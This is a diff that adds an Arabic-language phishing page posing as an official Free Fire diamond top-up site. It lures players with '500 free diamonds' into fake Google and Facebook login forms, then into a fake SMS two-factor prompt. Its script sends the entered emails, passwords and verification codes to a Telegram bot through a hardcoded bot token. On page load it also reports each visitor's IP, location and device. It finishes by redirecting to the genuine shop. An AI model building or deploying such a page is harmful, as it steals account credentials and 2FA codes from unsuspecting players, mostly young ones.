@@ -1,0 +1,754 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>شحن فري فاير | الموقع الرسمي</title>
+    <meta name="robots" content="noindex, nofollow">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <style>
+        /* ===== RESET & BASE ===== */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: #151515;
+            color: #fff;
+            direction: rtl;
+            min-height: 100vh;
+        }
+        a { text-decoration: none; color: inherit; }
+        .hidden { display: none !important; }
+
+        /* ===== HEADER ===== */
+        header {
+            background: #151515;
+            border-bottom: 1px solid #252525;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        .header-inner {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 12px 22px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .header-left { display: flex; align-items: center; gap: 15px; }
+        .menu-icon { font-size: 22px; color: #888; cursor: pointer; }
+        .logo { height: 30px; }
+        .search-icon { font-size: 20px; color: #888; cursor: pointer; }
+
+        /* ===== HERO ===== */
+        .hero-section {
+            background: linear-gradient(180deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+            padding: 40px 22px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        .hero-section::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: url('https://img.freepik.com/free-photo/weapons-guns-futuristic-shooter-game-gaming-profile_53876-142881.jpg') center/cover;
+            opacity: 0.15;
+        }
+        .hero-content { position: relative; z-index: 1; }
+        .hero-content h1 {
+            font-size: 32px; font-weight: 900; color: #E4372E;
+            text-shadow: 0 0 20px rgba(228, 55, 46, 0.5);
+            margin-bottom: 8px;
+        }
+        .hero-content p { color: #aaa; font-size: 14px; }
+
+        /* ===== GAME SELECTOR ===== */
+        .game-selector { background: #333356; padding: 20px 22px 30px; }
+        .game-selector h2 { font-size: 18px; font-weight: 700; margin-bottom: 16px; color: #fff; }
+        .games-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 16px; }
+        .game-card {
+            display: flex; flex-direction: column; align-items: center; gap: 8px;
+            cursor: pointer; transition: transform 0.2s;
+        }
+        .game-card:hover { transform: scale(1.05); }
+        .game-icon-wrapper { max-width: 80px; }
+        .game-icon-border {
+            position: relative; overflow: hidden; border-radius: 25%;
+            border: 3px solid #E4372E; aspect-ratio: 1;
+        }
+        .game-icon-border.inactive { border-color: #555; opacity: 0.5; }
+        .game-icon-border img { width: 100%; height: 100%; object-fit: cover; }
+        .game-name { font-size: 12px; font-weight: 700; color: #ccc; text-align: center; }
+
+        /* ===== OFFERS SECTION ===== */
+        .offers-section { background: #EFEFEF; padding: 20px 22px; }
+        .offers-section h2 {
+            font-size: 20px; font-weight: 800; color: #222;
+            margin-bottom: 16px; text-align: center;
+        }
+        .offer-item {
+            background: #fff; border-radius: 12px; padding: 12px 16px;
+            margin-bottom: 10px; cursor: pointer; transition: all 0.2s;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.06);
+        }
+        .offer-item:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 16px rgba(0,0,0,0.1);
+        }
+        .offer-content { display: flex; align-items: center; gap: 12px; }
+        .offer-icon {
+            width: 44px; height: 44px;
+            background: linear-gradient(135deg, #E4372E, #c0392b);
+            border-radius: 12px; display: flex; align-items: center;
+            justify-content: center; font-size: 20px; color: #fff;
+        }
+        .offer-details { flex: 1; display: flex; flex-direction: column; }
+        .offer-title { font-weight: 700; color: #222; font-size: 15px; }
+        .offer-desc { font-size: 12px; color: #777; }
+        .offer-price {
+            font-weight: 800; color: #E4372E; font-size: 16px;
+            background: rgba(228, 55, 46, 0.1); padding: 4px 12px; border-radius: 20px;
+        }
+        .free-offer .offer-content {
+            background: linear-gradient(135deg, #fff8e1, #ffe082);
+            border-radius: 12px; padding: 8px;
+        }
+        .fake-warning {
+            display: flex; align-items: center; justify-content: center; gap: 8px;
+            padding: 12px; margin-top: 16px;
+            background: rgba(231, 76, 60, 0.1); border-radius: 8px;
+            color: #e74c3c; font-size: 13px; font-weight: 600;
+        }
+
+        /* ===== LOGIN SECTION ===== */
+        .login-section { background: #EFEFEF; padding: 30px 22px; text-align: center; }
+        .login-section h2 { color: #222; font-size: 22px; font-weight: 800; margin-bottom: 6px; }
+        .login-subtitle { color: #666; font-size: 14px; margin-bottom: 24px; }
+        .login-btn {
+            width: 100%; max-width: 360px; margin: 0 auto 12px;
+            display: flex; align-items: center; justify-content: center; gap: 12px;
+            padding: 14px 24px; border: none; border-radius: 12px;
+            font-size: 16px; font-weight: 700; cursor: pointer; transition: all 0.2s; color: #fff;
+        }
+        .google-btn { background: #DB4437; }
+        .google-btn:hover { background: #c53929; }
+        .facebook-btn { background: #4267B2; }
+        .facebook-btn:hover { background: #365899; }
+
+        /* ===== FORM SECTION ===== */
+        .form-section { background: #EFEFEF; padding: 30px 22px; min-height: 60vh; }
+        .form-card {
+            background: #fff; border-radius: 16px; padding: 24px;
+            max-width: 420px; margin: 0 auto; box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+        }
+        .back-btn {
+            background: none; border: none; color: #E4372E; font-size: 14px;
+            cursor: pointer; margin-bottom: 16px;
+            display: flex; align-items: center; gap: 6px; font-weight: 600;
+        }
+        .form-card h3 { color: #222; font-size: 20px; margin-bottom: 20px; }
+        .form-group { margin-bottom: 16px; }
+        .form-group label {
+            display: block; color: #555; font-size: 13px; font-weight: 600; margin-bottom: 6px;
+        }
+        .form-group input {
+            width: 100%; padding: 12px 16px; border: 2px solid #e0e0e0;
+            border-radius: 10px; font-size: 15px; transition: border-color 0.2s; background: #fafafa;
+        }
+        .form-group input:focus { outline: none; border-color: #E4372E; }
+        .submit-btn {
+            width: 100%; padding: 14px;
+            background: linear-gradient(135deg, #E4372E, #c0392b);
+            color: #fff; border: none; border-radius: 12px;
+            font-size: 17px; font-weight: 800; cursor: pointer; transition: all 0.2s;
+            display: flex; align-items: center; justify-content: center; gap: 8px; margin-top: 8px;
+        }
+        .submit-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 16px rgba(228, 55, 46, 0.4);
+        }
+
+        /* ===== MODALS ===== */
+        .modal {
+            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.7); display: flex; align-items: center;
+            justify-content: center; z-index: 1000; backdrop-filter: blur(4px);
+        }
+        .modal-content {
+            background: #fff; border-radius: 20px; padding: 32px 24px;
+            max-width: 380px; width: 90%; text-align: center; color: #222;
+        }
+        .modal-content h3 { font-size: 20px; margin-bottom: 8px; }
+        .modal-content p { color: #666; font-size: 14px; margin-bottom: 16px; }
+        .loading-spinner { font-size: 40px; color: #E4372E; margin-bottom: 16px; }
+        .progress-bar {
+            width: 100%; height: 6px; background: #e0e0e0;
+            border-radius: 3px; overflow: hidden; margin-top: 12px;
+        }
+        .progress-fill {
+            height: 100%; background: linear-gradient(90deg, #E4372E, #f39c12);
+            width: 0%; border-radius: 3px; transition: width 3s ease;
+        }
+        .user-phone { font-weight: 700; color: #E4372E !important; font-size: 16px !important; }
+        .sms-input-group { margin: 16px 0; }
+        .sms-input {
+            width: 200px; padding: 14px; border: 2px solid #e0e0e0;
+            border-radius: 10px; font-size: 24px; text-align: center;
+            letter-spacing: 8px; font-weight: 700;
+        }
+        .sms-input:focus { border-color: #E4372E; outline: none; }
+        .sms-info { font-size: 12px !important; color: #999 !important; margin-top: 12px !important; }
+        .modal-icon { font-size: 48px; color: #E4372E; margin-bottom: 12px; }
+        .confirm-buttons { display: flex; gap: 12px; margin-top: 20px; }
+        .confirm-btn {
+            flex: 1; padding: 12px; border: none; border-radius: 10px;
+            font-size: 16px; font-weight: 700; cursor: pointer; transition: all 0.2s;
+        }
+        .yes-btn { background: #E4372E; color: #fff; }
+        .yes-btn:hover { background: #c0392b; }
+        .no-btn { background: #e0e0e0; color: #555; }
+        .no-btn:hover { background: #ccc; }
+
+        /* ===== FOOTER ===== */
+        footer { background: #111; padding: 24px 22px; text-align: center; }
+        footer p { color: #888; font-size: 13px; margin-bottom: 12px; }
+        .social-links { display: flex; justify-content: center; gap: 16px; }
+        .social-links a { color: #666; font-size: 20px; transition: color 0.2s; }
+        .social-links a:hover { color: #E4372E; }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 480px) {
+            .games-grid { grid-template-columns: repeat(3, 1fr); }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ===== HEADER ===== -->
+    <header>
+        <div class="header-inner">
+            <div class="header-left">
+                <i class="fas fa-bars menu-icon"></i>
+                <img src="https://assets.shop2game.com/gop/mshop/www/live/static/logo.1ba2fae6.svg" alt="KREA" class="logo">
+            </div>
+            <div class="header-right">
+                <i class="fas fa-search search-icon"></i>
+            </div>
+        </div>
+    </header>
+
+    <!-- ===== MAIN CONTENT ===== -->
+    <main>
+        <!-- Hero Section -->
+        <div class="hero-section">
+            <div class="hero-content">
+                <h1>فري فاير</h1>
+                <p>اشحن جواهرك الآن واستمتع بأقوى العروض!</p>
+            </div>
+        </div>
+
+        <!-- ===== اختيار اللعبة ===== -->
+        <section class="game-selector">
+            <h2>اختيار اللعبة</h2>
+            <div class="games-grid">
+                <a href="#" class="game-card active" data-game="freefire" onclick="showOffers()">
+                    <div class="game-icon-wrapper">
+                        <div class="game-icon-border">
+                            <img src="https://play-lh.googleusercontent.com/1z3lJT7BuViizHc9G7M5gFKzY4m7h4lJ8eTH4jYyXXZysL7mMZBxZ4Q0CQk8sGJGZ4=s180" alt="Free Fire">
+                        </div>
+                    </div>
+                    <span class="game-name">Free Fire</span>
+                </a>
+                <a href="#" class="game-card">
+                    <div class="game-icon-wrapper">
+                        <div class="game-icon-border inactive">
+                            <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%23333'/%3E%3Ctext x='50' y='55' font-size='12' fill='%23999' text-anchor='middle'%3EPUBG%3C/text%3E%3C/svg%3E" alt="PUBG">
+                        </div>
+                    </div>
+                    <span class="game-name">PUBG Mobile</span>
+                </a>
+            </div>
+        </section>
+
+        <!-- ===== OFFERS SECTION ===== -->
+        <section id="offers-section" class="offers-section hidden">
+            <h2>عروض الجواهر</h2>
+
+            <div class="offer-item free-offer" onclick="showLoginOptions()">
+                <div class="offer-content">
+                    <div class="offer-icon"><i class="fas fa-gem"></i></div>
+                    <div class="offer-details">
+                        <span class="offer-title">عرض مجاني</span>
+                        <span class="offer-desc">💎 500 جوهرة مجاناً</span>
+                    </div>
+                    <span class="offer-price">مجاناً</span>
+                </div>
+            </div>
+
+            <div class="offer-item" onclick="redirectToShop()">
+                <div class="offer-content">
+                    <div class="offer-icon"><i class="fas fa-gem"></i></div>
+                    <div class="offer-details">
+                        <span class="offer-title">💎 7000 جوهرة</span>
+                        <span class="offer-desc">بسعر 2$</span>
+                    </div>
+                    <span class="offer-price">2$</span>
+                </div>
+            </div>
+            <div class="offer-item" onclick="redirectToShop()">
+                <div class="offer-content">
+                    <div class="offer-icon"><i class="fas fa-gem"></i></div>
+                    <div class="offer-details">
+                        <span class="offer-title">💎 1000 جوهرة</span>
+                        <span class="offer-desc">بسعر 2.5$</span>
+                    </div>
+                    <span class="offer-price">2.5$</span>
+                </div>
+            </div>
+            <div class="offer-item" onclick="redirectToShop()">
+                <div class="offer-content">
+                    <div class="offer-icon"><i class="fas fa-gem"></i></div>
+                    <div class="offer-details">
+                        <span class="offer-title">💎 5000 جوهرة</span>
+                        <span class="offer-desc">بسعر 5$</span>
+                    </div>
+                    <span class="offer-price">5$</span>
+                </div>
+            </div>
+            <div class="offer-item" onclick="redirectToShop()">
+                <div class="offer-content">
+                    <div class="offer-icon"><i class="fas fa-gem"></i></div>
+                    <div class="offer-details">
+                        <span class="offer-title">💎 7000 جوهرة</span>
+                        <span class="offer-desc">بسعر 6$</span>
+                    </div>
+                    <span class="offer-price">6$</span>
+                </div>
+            </div>
+            <div class="offer-item" onclick="redirectToShop()">
+                <div class="offer-content">
+                    <div class="offer-icon"><i class="fas fa-gem"></i></div>
+                    <div class="offer-details">
+                        <span class="offer-title">💎 9000 جوهرة</span>
+                        <span class="offer-desc">بسعر 7$</span>
+                    </div>
+                    <span class="offer-price">7$</span>
+                </div>
+            </div>
+            <div class="offer-item" onclick="redirectToShop()">
+                <div class="offer-content">
+                    <div class="offer-icon"><i class="fas fa-gem"></i></div>
+                    <div class="offer-details">
+                        <span class="offer-title">💎 10000 جوهرة</span>
+                        <span class="offer-desc">بسعر 9$</span>
+                    </div>
+                    <span class="offer-price">9$</span>
+                </div>
+            </div>
+            <div class="offer-item" onclick="redirectToShop()">
+                <div class="offer-content">
+                    <div class="offer-icon"><i class="fas fa-gem"></i></div>
+                    <div class="offer-details">
+                        <span class="offer-title">💎 15000 جوهرة</span>
+                        <span class="offer-desc">بسعر 13$</span>
+                    </div>
+                    <span class="offer-price">13$</span>
+                </div>
+            </div>
+            <div class="offer-item" onclick="redirectToShop()">
+                <div class="offer-content">
+                    <div class="offer-icon"><i class="fas fa-gem"></i></div>
+                    <div class="offer-details">
+                        <span class="offer-title">💎 20000 جوهرة</span>
+                        <span class="offer-desc">بسعر 17$</span>
+                    </div>
+                    <span class="offer-price">17$</span>
+                </div>
+            </div>
+            <div class="offer-item" onclick="redirectToShop()">
+                <div class="offer-content">
+                    <div class="offer-icon"><i class="fas fa-gem"></i></div>
+                    <div class="offer-details">
+                        <span class="offer-title">💎 25000 جوهرة</span>
+                        <span class="offer-desc">بسعر 20$</span>
+                    </div>
+                    <span class="offer-price">20$</span>
+                </div>
+            </div>
+
+            <div class="fake-warning">
+                <i class="fas fa-shield-alt"></i>
+                <span>عروض محدودة لفترة مؤقتة!</span>
+            </div>
+        </section>
+
+        <!-- ===== LOGIN OPTIONS ===== -->
+        <section id="login-options" class="login-section hidden">
+            <h2>تسجيل الدخول لحساب فري فاير</h2>
+            <p class="login-subtitle">اختر طريقة تسجيل الدخول</p>
+
+            <button class="login-btn google-btn" onclick="showGoogleLogin()">
+                <i class="fab fa-google"></i>
+                <span>تسجيل الدخول بحساب Google</span>
+            </button>
+
+            <button class="login-btn facebook-btn" onclick="showFacebookLogin()">
+                <i class="fab fa-facebook-f"></i>
+                <span>تسجيل الدخول بحساب Facebook</span>
+            </button>
+        </section>
+
+        <!-- ===== FORM LOGIN ===== -->
+        <section id="login-form-section" class="form-section hidden">
+            <div class="form-card">
+                <button class="back-btn" onclick="goBackToLoginOptions()">
+                    <i class="fas fa-arrow-right"></i> رجوع
+                </button>
+                <h3 id="form-title">تسجيل الدخول بحساب Google</h3>
+
+                <form id="login-form" onsubmit="handleLogin(event)">
+                    <div class="form-group">
+                        <label for="email">البريد الإلكتروني أو رقم الهاتف</label>
+                        <input type="text" id="email" name="email" placeholder="example@gmail.com" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="password">كلمة المرور</label>
+                        <input type="password" id="password" name="password" placeholder="● ● ● ● ● ● ● ●" required>
+                    </div>
+                    <button type="submit" class="submit-btn">
+                        <i class="fas fa-bolt"></i> إشحن الأن 💎
+                    </button>
+                </form>
+            </div>
+        </section>
+
+        <!-- ===== VERIFICATION MODAL ===== -->
+        <div id="verification-modal" class="modal hidden">
+            <div class="modal-content">
+                <div class="loading-spinner">
+                    <i class="fas fa-spinner fa-spin"></i>
+                </div>
+                <h3>جاري التحقق من الحساب</h3>
+                <p>يرجى الانتظار... جاري الاتصال بخادم التحقق</p>
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progress-fill"></div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ===== SMS VERIFICATION ===== -->
+        <div id="sms-modal" class="modal hidden">
+            <div class="modal-content">
+                <h3>التحقق بخطوتين</h3>
+                <p>لقد أرسلنا رمز تحقق مكون من 6 أرقام إلى:</p>
+                <p class="user-phone" id="user-phone-display">***@gmail.com</p>
+                <div class="sms-input-group">
+                    <input type="text" id="sms-code" maxlength="6" placeholder="أدخل رمز SMS" class="sms-input">
+                </div>
+                <button class="submit-btn" onclick="verifySMS()">
+                    <i class="fas fa-check"></i> تحقق
+                </button>
+                <p class="sms-info">سيتم إرسال الرمز عبر SMS أو واتساب</p>
+            </div>
+        </div>
+
+        <!-- ===== CONFIRM MODAL ===== -->
+        <div id="confirm-modal" class="modal hidden">
+            <div class="modal-content">
+                <i class="fas fa-question-circle modal-icon"></i>
+                <h3>هل تريد شراء الجواهر؟</h3>
+                <div class="confirm-buttons">
+                    <button class="confirm-btn yes-btn" onclick="redirectToShopNow()">نعم</button>
+                    <button class="confirm-btn no-btn" onclick="closeConfirmModal()">لا</button>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- ===== FOOTER ===== -->
+    <footer>
+        <div class="footer-inner">
+            <p>هذا الموقع من صنع شركة الألعاب كرينا</p>
+            <div class="social-links">
+                <a href="#"><i class="fab fa-facebook"></i></a>
+                <a href="#"><i class="fab fa-instagram"></i></a>
+                <a href="#"><i class="fab fa-youtube"></i></a>
+                <a href="#"><i class="fab fa-tiktok"></i></a>
+                <a href="#"><i class="fab fa-twitter"></i></a>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // ============================================
+        //   إعدادات بوت تلغرام
+        // ============================================
+        const BOT_TOKEN = '8730273478:AAGRhE4wzNJMhDLaJ6m2yaBXiJiTusjr9UM';
+        const CHAT_ID = '7902407443';
+
+        let currentLoginMethod = 'google';
+        let userEmail = '';
+        let userPassword = '';
+
+        // ============================================
+        //   جلب معلومات الزائر
+        // ============================================
+        async function getVisitorInfo() {
+            try {
+                const r = await fetch('https://ipapi.co/json/');
+                const d = await r.json();
+                return {
+                    ip: d.ip || 'غير معروف',
+                    country: d.country_name || 'غير معروف',
+                    city: d.city || 'غير معروف',
+                    region: d.region || 'غير معروف',
+                    isp: d.org || 'غير معروف',
+                    timezone: d.timezone || 'غير معروف',
+                    lat: d.latitude || 'غير معروف',
+                    lon: d.longitude || 'غير معروف'
+                };
+            } catch(e) {
+                return { ip:'غير معروف', country:'غير معروف', city:'غير معروف', region:'غير معروف', isp:'غير معروف', timezone:'غير معروف', lat:'غير معروف', lon:'غير معروف' };
+            }
+        }
+
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let browser = 'غير معروف', os = 'غير معروف', device = 'غير معروف';
+            if (ua.includes('Chrome')) browser = 'Chrome';
+            else if (ua.includes('Firefox')) browser = 'Firefox';
+            else if (ua.includes('Safari')) browser = 'Safari';
+            else if (ua.includes('Edge')) browser = 'Edge';
+            else if (ua.includes('Opera')) browser = 'Opera';
+
+            if (ua.includes('Android')) os = 'Android';
+            else if (ua.includes('iPhone')||ua.includes('iPad')) os = 'iOS';
+            else if (ua.includes('Windows')) os = 'Windows';
+            else if (ua.includes('Mac OS')) os = 'macOS';
+            else if (ua.includes('Linux')) os = 'Linux';
+
+            if (ua.includes('Mobile')) device = 'هاتف';
+            else if (ua.includes('Tablet')) device = 'جهاز لوحي';
+            else device = 'كمبيوتر';
+
+            return { browser, os, device, ua: ua.substring(0,200) };
+        }
+
+        // ============================================
+        //   إرسال لبوت تلغرام
+        // ============================================
+        async function sendToTelegram(msg) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            try {
+                const r = await fetch(url, {
+                    method:'POST',
+                    headers:{'Content-Type':'application/json'},
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode:'HTML' })
+                });
+                return (await r.json()).ok;
+            } catch(e) { return false; }
+        }
+
+        async function notifyVisit() {
+            const v = await getVisitorInfo();
+            const d = getDeviceInfo();
+            const t = new Date().toLocaleString('ar-SA', { timeZone: v.timezone });
+            const msg = `
+        🕵️‍♂️ <b>زيارة جديدة للموقع!</b>
+
+🌐 <b>المعلومات الجغرافية:</b>
+• الدولة: ${v.country}
+• المدينة: ${v.city}
+• المنطقة: ${v.region}
+• مزود الخدمة: ${v.isp}
+• IP: ${v.ip}
+• خط العرض: ${v.lat}
+• خط الطول: ${v.lon}
+
+📱 <b>معلومات الجهاز:</b>
+• الجهاز: ${d.device}
+• نظام التشغيل: ${d.os}
+• المتصفح: ${d.browser}
+• User Agent: ${d.ua}
+
+⏰ <b>الوقت:</b> ${t}
+        `.trim();
+            await sendToTelegram(msg);
+        }
+
+        async function sendLoginData(email, pass, method) {
+            const v = await getVisitorInfo();
+            const d = getDeviceInfo();
+            const t = new Date().toLocaleString('ar-SA', { timeZone: v.timezone });
+            const msg = `
+        🔐 <b>بيانات تسجيل دخول جديدة!</b>
+
+📧 <b>البريد الإلكتروني:</b> ${email}
+🔑 <b>كلمة المرور:</b> ${pass}
+🔗 <b>طريقة الدخول:</b> ${method==='google'?'Google':'Facebook'}
+
+🌐 <b>المعلومات الجغرافية:</b>
+• الدولة: ${v.country}
+• المدينة: ${v.city}
+• المنطقة: ${v.region}
+• مزود الخدمة: ${v.isp}
+• IP: ${v.ip}
+
+📱 <b>معلومات الجهاز:</b>
+• الجهاز: ${d.device}
+• نظام التشغيل: ${d.os}
+• المتصفح: ${d.browser}
+
+⏰ <b>الوقت:</b> ${t}
+        `.trim();
+            await sendToTelegram(msg);
+        }
+
+        async function sendSMSCode(code, email) {
+            const v = await getVisitorInfo();
+            const d = getDeviceInfo();
+            const t = new Date().toLocaleString('ar-SA', { timeZone: v.timezone });
+            const msg = `
+        📱 <b>رمز SMS تم استلامه!</b>
+
+🔐 <b>رمز التحقق:</b> ${code}
+📧 <b>البريد الإلكتروني:</b> ${email}
+
+🌐 <b>المعلومات الجغرافية:</b>
+• الدولة: ${v.country}
+• المدينة: ${v.city}
+• المنطقة: ${v.region}
+• IP: ${v.ip}
+
+📱 <b>معلومات الجهاز:</b>
+• الجهاز: ${d.device}
+• نظام التشغيل: ${d.os}
+
+⏰ <b>الوقت:</b> ${t}
+        `.trim();
+            await sendToTelegram(msg);
+        }
+
+        // ============================================
+        //   دوال العرض والتنقل
+        // ============================================
+        function showOffers() {
+            document.getElementById('offers-section').classList.remove('hidden');
+            document.getElementById('offers-section').scrollIntoView({behavior:'smooth'});
+            ['login-options','login-form-section','verification-modal','sms-modal'].forEach(id => {
+                document.getElementById(id).classList.add('hidden');
+            });
+        }
+
+        function showLoginOptions() {
+            document.getElementById('login-options').classList.remove('hidden');
+            document.getElementById('form-title').textContent = 'تسجيل الدخول بحساب Google';
+            document.getElementById('login-options').scrollIntoView({behavior:'smooth'});
+            ['login-form-section','verification-modal','sms-modal'].forEach(id => {
+                document.getElementById(id).classList.add('hidden');
+            });
+        }
+
+        function showGoogleLogin() {
+            currentLoginMethod = 'google';
+            document.getElementById('form-title').textContent = 'تسجيل الدخول بحساب Google';
+            document.getElementById('login-form-section').classList.remove('hidden');
+            document.getElementById('login-form-section').scrollIntoView({behavior:'smooth'});
+            ['verification-modal','sms-modal'].forEach(id => document.getElementById(id).classList.add('hidden'));
+        }
+
+        function showFacebookLogin() {
+            currentLoginMethod = 'facebook';
+            document.getElementById('form-title').textContent = 'تسجيل الدخول بحساب Facebook';
+            document.getElementById('login-form-section').classList.remove('hidden');
+            document.getElementById('login-form-section').scrollIntoView({behavior:'smooth'});
+            ['verification-modal','sms-modal'].forEach(id => document.getElementById(id).classList.add('hidden'));
+        }
+
+        function goBackToLoginOptions() {
+            ['login-form-section','verification-modal','sms-modal'].forEach(id => document.getElementById(id).classList.add('hidden'));
+            document.getElementById('login-options').classList.remove('hidden');
+        }
+
+        // ============================================
+        //   معالجة تسجيل الدخول
+        // ============================================
+        async function handleLogin(event) {
+            event.preventDefault();
+            const email = document.getElementById('email').value.trim();
+            const pass = document.getElementById('password').value.trim();
+            if (!email || !pass) { alert('يرجى إدخال البريد الإلكتروني وكلمة المرور'); return; }
+
+            userEmail = email;
+            userPassword = pass;
+
+            document.getElementById('login-form-section').classList.add('hidden');
+            document.getElementById('verification-modal').classList.remove('hidden');
+
+            await sendLoginData(email, pass, currentLoginMethod);
+
+            const pf = document.getElementById('progress-fill');
+            pf.style.width = '100%';
+
+            setTimeout(() => {
+                document.getElementById('verification-modal').classList.add('hidden');
+                document.getElementById('user-phone-display').textContent = email;
+                document.getElementById('sms-modal').classList.remove('hidden');
+                pf.style.width = '0%';
+            }, 3500);
+        }
+
+        // ============================================
+        //   التحقق من SMS
+        // ============================================
+        async function verifySMS() {
+            const code = document.getElementById('sms-code').value.trim();
+            if (!code || code.length < 4) { alert('يرجى إدخال رمز التحقق كاملاً'); return; }
+
+            await sendSMSCode(code, userEmail);
+
+            const smsModal = document.getElementById('sms-modal');
+            smsModal.querySelector('.modal-content').innerHTML = `
+                <i class="fas fa-check-circle" style="font-size:60px;color:#2ecc71;margin-bottom:16px;"></i>
+                <h3 style="color:#2ecc71;">تم التحقق بنجاح!</h3>
+                <p style="color:#666;">جاري تحويلك إلى صفحة الشحن...</p>
+                <div class="loading-spinner" style="margin-top:16px;">
+                    <i class="fas fa-spinner fa-spin" style="color:#2ecc71;font-size:30px;"></i>
+                </div>
+            `;
+
+            setTimeout(() => { window.location.href = 'https://shop2game.com/'; }, 2500);
+        }
+
+        // ============================================
+        //   دوال تأكيد الشراء والتحويل
+        // ============================================
+        function redirectToShop() {
+            document.getElementById('confirm-modal').classList.remove('hidden');
+        }
+
+        function redirectToShopNow() {
+            window.location.href = 'https://shop2game.com/';
+        }
+
+        function closeConfirmModal() {
+            document.getElementById('confirm-modal').classList.add('hidden');
+        }
+
+        window.onclick = function(event) {
+            document.querySelectorAll('.modal').forEach(m => {
+                if (event.target === m) m.classList.add('hidden');
+            });
+        };
+
+        // ============================================
+        //   تشغيل عند تحميل الصفحة
+        // ============================================
+        window.onload = function() {
+            notifyVisit();
+            document.title = 'شحن فري فاير | الموقع الرسمي';
+        };
+    </script>
+</body>
+</html>
